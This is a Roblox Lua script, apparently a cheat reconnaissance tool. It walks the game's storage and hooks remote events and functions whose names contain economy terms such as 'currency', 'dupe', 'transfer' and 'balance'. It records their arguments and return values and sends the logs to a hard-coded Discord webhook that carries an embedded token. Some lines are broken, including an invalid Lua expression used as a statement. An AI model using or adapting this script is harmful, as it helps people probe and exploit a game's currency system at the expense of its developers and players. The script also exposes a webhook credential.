local WEBHOOK_URL = "https://discord.com/api/webhooks/1575380934860079217/70M7ZvEDzmoCA_YGtpvTc4khFp36TsZTQoLLwcOE5IfNoPEPRIXTqUORdcY8bZFgTNUf"
local LOG_INTERVAL = 2
local KEYWORDS = {"gem","currency","transfer","balance","coin","credit","dupe","add","remove","spend","purchase","shop","buy","sell"}

-- ==================== WEBHOOK ====================
local logBuffer = {}
local lastSend = 0

local function log(msg)
    local e = os.date("%H:%M:%S").." | "..msg
    table.insert(logBuffer, e)
    print("[RECON] "..e)
end

local function flush()
    if #logBuffer==0 then return end
    local now = tick()
    if now-lastSend < LOG_INTERVAL then return end
    lastSend = now
    local c = table.concat(logBuffer,"\n")
    if #c>1900 then c=c:sub(1,1900).."..." end
    logBuffer = {}
    pcall(function()
        local payload = '{"content":"'..c:gsub('"','\\"'):gsub("\n","\\n")..'"}'
        if _G.http_post then
            _G.http_post(WEBHOOK_URL, payload, {["content-type"]="application/json"})
        else
            game:HttpRequest and game:HttpRequest(WEBHOOK_URL,{
                Method="POST",
                Headers={["Content-Type"]="application/json"},
                Body=payload
            })
        end
    end)
end

spawn(function() while true do wait(1) flush() end end)

-- ==================== REMOTE HOOK ====================
local function match(name)
    local l=name:lower()
    for _,k in ipairs(KEYWORDS) do if l:find(k) then return true end end
    return false
end

local function hook(parent,depth)
    depth=depth or 0
    if depth>6 then return end
    for _,ch in ipairs(parent:GetChildren()) do
        if ch:IsA("RemoteEvent") and match(ch.Name) then
            log("HOOK RE: "..ch:GetFullName())
            ch.OnClientEvent:Connect(function(...)
                local a={}
                for i=1,select("#",...) do
                    local v=select(i,...)
                    if typeof(v)=="string" then a[i]='"'..v:sub(1,40)..'"'
                    elseif typeof(v)=="number" then a[i]=tostring(v)
                    elseif typeof(v)=="boolean" then a[i]=tostring(v)
                    else a[i]=typeof(v) end
                end
                log("  >> ["..ch.Name.."]: "..table.concat(a,", "))
            end)
        elseif ch:IsA("RemoteFunction") and match(ch.Name) then
            log("HOOK RF: "..ch:GetFullName())
            -- Wrap InvokeServer
            local orig=ch.InvokeServer
            ch.InvokeServer=function(self,...)
                local a={}
                for i=1,select("#",...) do
                    local v=select(i,...)
                    if typeof(v)=="string" then a[i]='"'..v:sub(1,40)..'"'
                    elseif typeof(v)=="number" then a[i]=tostring(v)
                    else a[i]=typeof(v) end
                end
                log("  >> CALL ["..self.Name.."]: "..table.concat(a,", "))
                local r=orig(self,...)
                log("  << RET ["..self.Name.."]: "..tostring(r))
                return r
            end
        end
        hook(ch,depth+1)
    end
end

pcall(function()
    log("=== HOOK REMOTES ===")
    hook(game.ReplicatedStorage,0)
    pcall(function() hook(game.ServerStorage,0) end)
    log("=== HOOK XONG ===")
end)

